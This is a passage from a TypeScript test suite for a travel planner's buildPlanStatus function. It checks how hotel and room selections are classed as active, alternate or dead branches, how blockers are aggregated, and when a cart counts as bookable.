      },
      BASE,
    );
    expect(s.blockers.filter((b) => b.kind === "SELECTION_INPUT")).toEqual([]);
    const sel = s.goals[0].selections.find((x) => x.selectionId === "room-dead-input")!;
    expect(sel.branch).toBe("deadBranch");
    // State stays inspectable in the detail — suppression hides the blocker, not the selection.
    expect(sel.status).toBe("AWAITING_INPUT");
    expect(s.goals[0].alternateBranchCount).toBe(1);
  });

  it("a dead-branch selection still FETCHING emits NO OPTIONS_PENDING wait (readiness not held IN_PROGRESS by a lost branch)", () => {
    const s = buildPlanStatus(
      {
        tripPlan: plan(),
        tripPlanGoals: [
          goalWithSettledRoom([
            {
              id: "room-dead-fetch",
              type: "HotelRoom",
              mode: "Single",
              isComplete: false,
              blueprintMonitorId: "m9", // monitor set, no options → FETCHING
              mirrorListSelectionId: "lst-unchosen",
              options: [],
            },
          ]),
        ],
      },
      BASE,
    );
    // No OPTIONS_PENDING for the lost branch (the empty test cart's own
    // CART_PENDING wait is unrelated, pre-existing behavior).
    expect(s.waiting.filter((w) => w.kind === "OPTIONS_PENDING")).toEqual([]);
    const sel = s.goals[0].selections.find((x) => x.selectionId === "room-dead-fetch")!;
    expect(sel.branch).toBe("deadBranch");
    expect(sel.status).toBe("FETCHING");
  });
});

describe("buildPlanStatus — VOY-1718 untyped selections are never grouped (PR #79 review)", () => {
  it("null-type selections don't suppress or aggregate each other — each keeps its ordinary blocker", () => {
    const s = buildPlanStatus(
      {
        tripPlan: plan(),
        tripPlanGoals: [
          goal({
            id: "gU",
            name: "Untyped",
            type: null,
            items: [
              {
                id: "iU",
                selections: [
                  // A complete untyped selection...
                  { id: "u-done", type: null, mode: "Single", isComplete: true, blueprintMonitorId: "m", options: [{ id: "o1", name: "A" }], travellerOptionChoices: [choice("t1", "o1")] },
                  // ...must NOT suppress these unrelated untyped pending picks
                  { id: "u-pend-1", type: null, mode: "Single", isComplete: false, blueprintMonitorId: "m", options: [{ id: "o2", name: "B" }], travellerOptionChoices: [choice("t1", null)] },
                  { id: "u-pend-2", type: null, mode: "Single", isComplete: false, blueprintMonitorId: "m", options: [{ id: "o3", name: "C" }], travellerOptionChoices: [choice("t1", null)] },
                ],
              },
            ],
          }),
        ],
      },
      BASE,
    );
    // No suppression, no aggregation: two ordinary PICK_PENDING blockers survive.
    const picks = s.blockers.filter((b) => b.kind === "PICK_PENDING");
    expect(picks.map((b) => b.refs.selectionId).sort()).toEqual(["u-pend-1", "u-pend-2"]);
    expect(picks.every((b) => !b.candidateSelectionIds)).toBe(true);
    expect(s.goals[0].alternateBranchCount).toBe(0);
    expect(s.goals[0].selections.every((x) => x.branch === "active")).toBe(true);
  });
});

describe("buildPlanStatus — VOY-1718 cart-settled selection never suppresses itself (PR #79 review)", () => {
  it("a cart-joined bookable selection with lagging isComplete stays 'active'; only its true siblings suppress", () => {
    const s = buildPlanStatus(
      {
        tripPlan: plan({
          cart: {
            itemCount: 1,
            total: 500,
            currency: "USD",
            items: [{ selectionId: "rate-live", optionId: "oR" }],
          },
        }),
        tripPlanGoals: [
          goal({
            id: "gL",
            name: "Secure Lodging",
            type: "Hotel",
            items: [
              {
                id: "iL",
                selections: [
                  // The chosen chain's rate: bookable item IS in the cart, but
                  // the backend hasn't flipped isComplete yet.
                  { id: "rate-live", type: "HotelRoomRate", mode: "Single", isComplete: false, blueprintMonitorId: "m", mirrorListSelectionId: "lst-chosen", options: [{ id: "oR", name: "Flexible", isBookable: true }], travellerOptionChoices: [choice("t1", "oR")] },
                  // A dead-branch rate under an unchosen room.
                  { id: "rate-dead", type: "HotelRoomRate", mode: "Single", isComplete: false, blueprintMonitorId: "m", mirrorListSelectionId: "lst-unchosen", options: [{ id: "oX", name: "Saver", isBookable: true }], travellerOptionChoices: [choice("t1", null)] },
                ],
              },
            ],
          }),
        ],
      },
      BASE,
    );
    const gL = s.goals[0];
    const live = gL.selections.find((x) => x.selectionId === "rate-live")!;
    const dead = gL.selections.find((x) => x.selectionId === "rate-dead")!;
    // The cart-settled selection is evidence, not a suppression target.
    expect(live.branch).toBe("active");
    expect(dead.branch).toBe("deadBranch");
    expect(gL.alternateBranchCount).toBe(1); // only rate-dead
    expect(s.blockers.filter((b) => b.refs.selectionId === "rate-live")).toEqual([]);
  });
});

describe("buildPlanStatus — VOY-1718 aggregate branch count with mixed null mirrors (PR #79 review)", () => {
  it("candidates without mirrorListSelectionId each count as their own branch (no undercount)", () => {
    const s = buildPlanStatus(
      {
        tripPlan: plan(),
        tripPlanGoals: [
          goal({
            id: "gM",
            name: "Secure Lodging",
            type: "Hotel",
            items: [
              {
                id: "iM",
                selections: [
                  // Two candidates mirror the same list, two have NO mirror id.
                  { id: "m-1", type: "HotelRoom", mode: "Single", isComplete: false, blueprintMonitorId: "m", mirrorListSelectionId: "lst-1", options: [{ id: "o1", name: "A" }], travellerOptionChoices: [choice("t1", null)] },
                  { id: "m-2", type: "HotelRoom", mode: "Single", isComplete: false, blueprintMonitorId: "m", mirrorListSelectionId: "lst-1", options: [{ id: "o2", name: "B" }], travellerOptionChoices: [choice("t1", null)] },
                  { id: "m-3", type: "HotelRoom", mode: "Single", isComplete: false, blueprintMonitorId: "m", mirrorListSelectionId: null, options: [{ id: "o3", name: "C" }], travellerOptionChoices: [choice("t1", null)] },
                  { id: "m-4", type: "HotelRoom", mode: "Single", isComplete: false, blueprintMonitorId: "m", options: [{ id: "o4", name: "D" }], travellerOptionChoices: [choice("t1", null)] },
                ],
              },
            ],
          }),
        ],
      },
      BASE,
    );
    const agg = s.blockers.find((b) => b.candidateSelectionIds);
    expect(agg).toBeTruthy();
    expect(agg!.candidateSelectionIds).toHaveLength(4);
    // lst-1 (shared) + m-3 (own) + m-4 (own) = 3 branches — NOT 1 (the old
    // filter(Boolean) undercount).
    expect(agg!.message).toContain("4 candidate selection(s) across 3 sibling branch(es)");
  });
});

// ── VOY-1724: hotelCode room-chain matching ─────────────────────────────────

/** A COMPLETE Hotel decision (chosen option "hopt-A"). */
const hotelDecision = () => ({
  id: "hotel-dec",
  type: "Hotel",
  mode: "Single",
  isComplete: true,
  blueprintMonitorId: "m",
  mirrorListSelectionId: "hotel-list",
  options: [{ id: "hopt-A", name: "Alpha Hotel", isBookable: false }],
  travellerOptionChoices: [choice("t1", "hopt-A")],
});
/** A pending HotelRoom decision mirroring `mirror`. */
const roomDec = (id: string, mirror: string, type = "HotelRoom") => ({
  id,
  type,
  mode: "Single",
  isComplete: false,
  blueprintMonitorId: "m",
  mirrorListSelectionId: mirror,
  options: [{ id: `${id}-o`, name: "Room", isBookable: false }],
  travellerOptionChoices: [choice("t1", null)],
});
/** A COMPLETE HotelRoom decision. */
const roomDone = (id: string, mirror: string) => ({
  ...roomDec(id, mirror),
  isComplete: true,
  travellerOptionChoices: [choice("t1", `${id}-o`)],
});
const hotelGoal = (rooms: Record<string, unknown>[]) =>
  goal({
    id: "gh",
    name: "Secure Lodging",
    type: "Hotel",
    items: [
      {
        id: "ih",
        selections: [
          hotelDecision(),
          { id: "hotel-list", type: "HotelList", mode: "List", blueprintMonitorId: "m", options: [{ id: "hopt-A", name: "Alpha Hotel" }] },
          ...rooms,
        ],
      },
    ],
  });
const lodging = (s: ReturnType<typeof buildPlanStatus>) => s.goals.find((g) => g.goalId === "gh")!;
const sel = (s: ReturnType<typeof buildPlanStatus>, id: string) =>
  lodging(s).selections.find((x) => x.selectionId === id)!;

describe("buildPlanStatus — VOY-1724 hotelCode matching", () => {
  it("marks code-mismatched room chains deadBranch and keeps the matching one active — pre-room-pick, zero completed rooms", () => {
    const s = buildPlanStatus(
      { tripPlan: plan(), tripPlanGoals: [hotelGoal([roomDec("room-A", "list-A"), roomDec("room-B", "list-B")])] },
      BASE,
      new Map([["hotel-dec", "HC-001"], ["room-A", "HC-001"], ["room-B", "HC-002"]]),
    );
    expect(sel(s, "room-A").branch).toBe("active");
    expect(sel(s, "room-B").branch).toBe("deadBranch");
    expect(s.summary.alternateBranchCount).toBe(1);
    // Aggregate collapses to the matching chain and SAYS it names the chosen hotel.
    const picks = s.blockers.filter((b) => b.kind === "PICK_PENDING");
    expect(picks).toHaveLength(1);
    expect(picks[0].candidateSelectionIds).toEqual(["room-A"]);
    expect(picks[0].message).toContain("chosen hotel");
    expect(picks[0].message).toContain("1 candidate selection");
    // A 1-candidate collapse routes straight to the pick (real selection id).
    expect(s.nextSteps).toContain("voyagier select --selection-id room-A --option-id <optionId>");
  });

  it("collapses ≥2 matching same-hotel candidates (same type) into ONE 'chosen hotel' blocker, dropping mismatches", () => {
    // Two HotelRoom mirrors of the SAME chosen hotel (grouping is by type) plus
    // one under a different hotel.
    const s = buildPlanStatus(
      {
        tripPlan: plan(),
        tripPlanGoals: [
          hotelGoal([
            roomDec("room-A", "list-A"),
            roomDec("room-A2", "list-A"),
            roomDec("room-B", "list-B"),
          ]),
        ],
      },
      BASE,
      new Map([
        ["hotel-dec", "HC-001"],
        ["room-A", "HC-001"],
        ["room-A2", "HC-001"],
        ["room-B", "HC-002"],
      ]),
    );
    const picks = s.blockers.filter((b) => b.kind === "PICK_PENDING");
    expect(picks).toHaveLength(1);
    expect(picks[0].candidateSelectionIds!.sort()).toEqual(["room-A", "room-A2"]);
    expect(picks[0].message).toContain("chosen hotel");
    expect(picks[0].message).toContain("2 candidate selection(s)");
    expect(sel(s, "room-B").branch).toBe("deadBranch");
    expect(s.summary.alternateBranchCount).toBe(1); // only room-B
  });

  it("when the matching room is already complete, its same-hotel mirror is an alternate and the mismatch is dead", () => {
    const s = buildPlanStatus(
      {
        tripPlan: plan(),
        tripPlanGoals: [
          hotelGoal([roomDone("room-A", "list-A"), roomDec("room-A2", "list-A"), roomDec("room-B", "list-B")]),
        ],
      },
      BASE,
      new Map([
        ["hotel-dec", "HC-001"],
        ["room-A", "HC-001"],
        ["room-A2", "HC-001"],
        ["room-B", "HC-002"],
      ]),
    );
    expect(sel(s, "room-A").branch).toBe("active");
    expect(sel(s, "room-A2").branch).toBe("alternate");
    expect(sel(s, "room-B").branch).toBe("deadBranch");
    expect(s.blockers.filter((b) => b.kind === "PICK_PENDING")).toEqual([]);
    expect(s.summary.alternateBranchCount).toBe(2);
  });

  it("falls back to the VOY-1718 rule when the chosen hotel's code is missing", () => {
    // Map omits "hotel-dec" → chosenHotelCode undefined → legacy aggregation.
    const s = buildPlanStatus(
      { tripPlan: plan(), tripPlanGoals: [hotelGoal([roomDec("room-A", "list-A"), roomDec("room-B", "list-B")])] },
      BASE,
      new Map([["room-A", "HC-001"], ["room-B", "HC-002"]]),
    );
    const agg = s.blockers.find((b) => b.candidateSelectionIds);
    expect(agg!.candidateSelectionIds!.sort()).toEqual(["room-A", "room-B"]);
    expect(agg!.message).toContain("across 2 sibling branch(es)");
    // Neither is code-suppressed under the fallback.
    expect(sel(s, "room-A").branch).toBe("active");
    expect(sel(s, "room-B").branch).toBe("active");
    expect(s.summary.alternateBranchCount).toBe(0);
  });

  it("REQUIREMENT_UNMET pointing at a code-mismatched chain downgrades to unverified", () => {
    const g = {
      ...hotelGoal([roomDec("room-A", "list-A"), roomDec("room-B", "list-B")]),
      checkoutReadiness: {
        isReady: false,
        requirements: [
          { label: "Room", isFulfilled: false, isRequired: true, selectionId: "room-B", type: "ParticipantChoice" },
        ],
      },
    };
    const s = buildPlanStatus(
      { tripPlan: plan(), tripPlanGoals: [g] },
      BASE,
      new Map([["hotel-dec", "HC-001"], ["room-A", "HC-001"], ["room-B", "HC-002"]]),
    );
    const req = s.blockers.find((b) => b.kind === "REQUIREMENT_UNMET" && b.message.startsWith("Secure Lodging: Room"));
    expect(req).toMatchObject({ unverified: true });
    expect(req!.message).toContain("references an alternate branch");
  });
});

describe("buildPlanStatus — VOY-1724 bookableNow", () => {
  it("true when the cart is bookable and every blocker is unverified (BLOCKED but really bookable)", () => {
    const s = buildPlanStatus(
      {
        tripPlan: plan({ cart: bookableCart() }),
        tripPlanGoals: [
          goal({
            items: [{ id: "i1", selections: [pickedSelection()] }],
            checkoutReadiness: {
              isReady: false,
              // Null-ref requirement → unverified REQUIREMENT_UNMET (the only blocker).
              requirements: [{ label: "Cabin class", isFulfilled: false, isRequired: true, type: "ParticipantChoice", missingTravellerIds: [] }],
            },
          }),
        ],
      },
      BASE,
    );
    expect(s.readiness).toBe("BLOCKED");
    expect(s.blockers.every((b) => b.unverified)).toBe(true);
    expect(s.summary.bookableNow).toBe(true);
  });

  it("false when a verifiable blocker remains", () => {
    const s = buildPlanStatus(
      {
        tripPlan: plan({ cart: bookableCart() }),
        tripPlanGoals: [
          goal({
            items: [{ id: "i1", selections: [pickedSelection()] }],
            checkoutReadiness: {
              isReady: false,
              requirements: [{ label: "Pick", isFulfilled: false, isRequired: true, selectionId: "s-other", type: "ParticipantChoice" }],
            },
          }),
        ],
      },
      BASE,
    );
    expect(s.summary.bookableNow).toBe(false);
  });

  it("false when the cart holds no bookable item", () => {
    const s = buildPlanStatus(
      {
        tripPlan: plan({ cart: { itemCount: 1, total: 100, currency: "USD", items: [{ selectionId: "s1", optionId: "o-unknown" }] } }),
        tripPlanGoals: [goal({ items: [{ id: "i1", selections: [pickedSelection()] }] })],
      },
      BASE,
    );
    expect(s.cart.bookableCount).toBe(0);
    expect(s.summary.bookableNow).toBe(false);
  });
});
